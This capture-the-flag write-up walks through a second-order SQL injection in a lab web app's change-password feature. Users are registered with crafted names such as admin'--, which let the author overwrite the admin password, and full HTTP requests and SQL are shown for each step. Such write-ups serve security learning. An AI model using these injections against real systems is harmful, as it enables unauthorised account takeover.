# Challenge 10 - Vulnerable Startup: Change Password

> For this challenge, the vulnerability on the note page has been fixed. A new change password function has been added to the application, so the users can now change their password by navigating to the Profile page. The new function is vulnerable to SQL injection because the UPDATE statement concatenates the username directly into the SQL query. The goal here is to exploit the vulnerable function to gain access to the admin's account.

It seems the description of this challenge has done much of the heavy lifting by indicating that the SQL injection vulnerability is in the `UPDATE` statement of the change password functionality of the Profile page in the `username` parameter. Create an account and navigate to the Profile page. Save the request made to create the account, as it will probably be useful later.

```http
POST /challenge5/signup HTTP/1.1
Host: 10.10.141.250:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://10.10.141.250:5000
DNT: 1
Connection: close
Referer: http://10.10.141.250:5000/challenge5/signup
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=tgihf&password=pass
```

The Profile page is a simple change password form with parameters `current-password`, `password`, and `password2` that submits a `POST` request to `/challenge5/changepwd`.

![[Pasted image 20210807174654](Pasted%20image%2020210807174654.png)

The application probably goes through a process like this in changing the password:
1. Check if `password` and `password2` are equivalent. If so, proceed
2. Change the user's password if `current-password` is the password of the currently logged on user. This can be achieved with the following SQL query:

```sql
UPDATE users SET password = '$PASSWORD' WHERE username = '$USERNAME' AND password = '$CURRENT-PASSWORD'
```

The challenge description revealed that this statement is injectable via the `username` parameter. Confirm this by registering a user with the username `'` and password `pass`. Attempt to change the password to `not-pass`. If the change fails, it is likely because the injected username broke the syntax of the `UPDATE` statement. This will confirm the presence of the SQL injection vulnerability.

Regster the user.

```http
POST /challenge5/signup HTTP/1.1
Host: 10.10.141.250:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://10.10.141.250:5000
DNT: 1
Connection: close
Referer: http://10.10.141.250:5000/challenge5/signup
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username='&password=pass
```

Log in and attempt to change the password to `not-pass`.

```http
POST /challenge5/changepwd HTTP/1.1
Host: 10.10.141.250:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: http://10.10.141.250:5000
DNT: 1
Connection: close
Referer: http://10.10.141.250:5000/challenge5/changepwd
Cookie: session=.eJyrVkrOSMzJSc1LTzWNLy1OLYrPTFGyMtdBF85LzE1VslJSV6oFAM2iEXw.YQ8CMQ.7qrdg9QZdsAHs7aP1M4DGWqLY7g
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

current-password=pass&password=not-pass&password2=not-pass
```

The request fails, confirming the presence of the SQL injection vulnerability.

![Pasted image 20210807180510](Pasted%20image%2020210807180510.png)

The goal of this challenge is to log in as the `admin` user. It may be possible to change `admin`'s password directly by exploiting this vulnerability. The injection `admin'--` would cause the following SQL query to be executed on the backend:

```sql
UPDATE users SET password = '$PASSWORD' WHERE username = 'admin'--' AND password = '$CURRENT-PASSWORD'
```

This directly changes `admin`'s password without having to know their current password. Register an account with the username `admin'--`.

```http
POST /challenge5/signup HTTP/1.1
Host: 10.10.141.250:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://10.10.141.250:5000
DNT: 1
Connection: close
Referer: http://10.10.141.250:5000/challenge5/signup
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin'--&password=pass
```

Login and change their password to `pass`.

```http
POST /challenge5/changepwd HTTP/1.1
Host: 10.10.141.250:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Origin: http://10.10.141.250:5000
DNT: 1
Connection: close
Referer: http://10.10.141.250:5000/challenge5/changepwd
Cookie: session=.eJyrVkrOSMzJSc1LTzWNLy1OLYrPTFGystBBF85LzE1VslJKTMnNzFPX1VWqBQBUgBPg.YQ8Efw._gTOzKAyJ8E41N2U6SkeseKWAhU
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

current-password=pass&password=pass&password2=pass
```

Login with the credentials `admin`:`pass` and obtain the flag.